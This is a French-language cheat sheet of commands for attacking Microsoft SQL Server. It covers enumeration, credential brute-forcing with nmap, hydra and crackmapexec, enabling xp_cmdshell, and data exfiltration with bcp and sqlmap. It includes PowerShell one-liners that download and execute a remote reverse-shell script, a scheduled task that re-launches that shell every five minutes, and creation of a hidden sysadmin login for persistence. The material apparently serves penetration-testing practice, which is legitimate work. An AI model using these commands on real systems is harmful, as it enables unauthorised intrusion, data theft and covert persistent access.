# 🧩 MSSQL - Cheatsheet Cybersécurité

Ce fichier contient les commandes essentielles et les outils pour **scanner**, **accéder**, **exploiter**, et **maintenir l’accès** à une base MSSQL.

---

## 🔍 1. Connexion & Enumération

sqlcmd -S IP -U sa -P 'password'  
> Connexion à MSSQL avec les identifiants `sa`

osql -S IP -U sa -P 'password'  
> Ancienne version de client CLI MSSQL

SELECT @@version;  
> Obtenir la version SQL Server (utile pour trouver des exploits)

SELECT name FROM master..sysdatabases;  
> Affiche les bases disponibles

USE <dbname>;  
> Changer de base

SELECT name FROM sysobjects WHERE xtype = 'U';  
> Affiche toutes les tables

SELECT * FROM <table>;  
> Affiche les données

---

## 🔓 2. Authentification faible / bruteforce

nmap -p 1433 --script ms-sql-info <IP>  
> Enumération des infos MSSQL exposées

nmap --script ms-sql-brute -p 1433 <IP>  
> Bruteforce d’identifiants SQL

hydra -L users.txt -P pass.txt mssql://IP  
> Bruteforce d’un serveur MSSQL

crackmapexec mssql IP -u sa -p 'password'  
> Teste l’accès à MSSQL avec `crackmapexec`

---

## 🐚 3. Commandes OS via xp_cmdshell

### 📌 Activation

EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
> Active l’exécution de commandes système

### 💣 Exécution

EXEC xp_cmdshell 'whoami';  
> Exécute une commande système (si les privilèges le permettent)

EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\")"';  
> Télécharge et exécute un reverse shell via PowerShell

---

## 🎯 4. Exfiltration de données

SELECT * FROM users;  
> Dump de table

bcp database..table out file.txt -c -U user -S IP -P pass  
> Export de données via `bcp` (Bulk Copy Program)

sqlmap -u "http://victime.com/page.php?id=1" --dbms=mssql  
> Exploite une injection SQL ciblant MSSQL

---

## 🛠 5. Outils d'exploitation

- `crackmapexec`  
> Enumération + exécution de commande + NTLM relay

- `impacket-mssqlclient.py`  
> Connexion MSSQL avec exécution de commandes via NTLM

- `PowerUpSQL`  
> Outil post-exploitation MSSQL complet (enumeration, privesc, persistence)

---

## 🧬 6. Persistance & Post-Exploitation

### 🔑 Création d’un nouvel utilisateur admin

CREATE LOGIN hacker WITH PASSWORD = 'P@ssw0rd123';  
CREATE USER hacker FOR LOGIN hacker;  
EXEC sp_addsrvrolemember 'hacker', 'sysadmin';  
> Crée un utilisateur avec les droits `sysadmin`

### 🛠 Tâche planifiée

EXEC xp_cmdshell 'schtasks /create /tn revshell /tr "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\")" /sc minute /mo 5';  
> Tâche planifiée pour reverse shell

---

## 🧹 7. Nettoyage

DROP LOGIN hacker;  
> Supprimer utilisateur malveillant

EXEC sp_configure 'xp_cmdshell', 0;  
> Désactive xp_cmdshell

DEL payload.exe  
> Supprimer fichiers téléchargés

---

## 📚 8. Ressources

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [MSSQL Cheatsheet HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

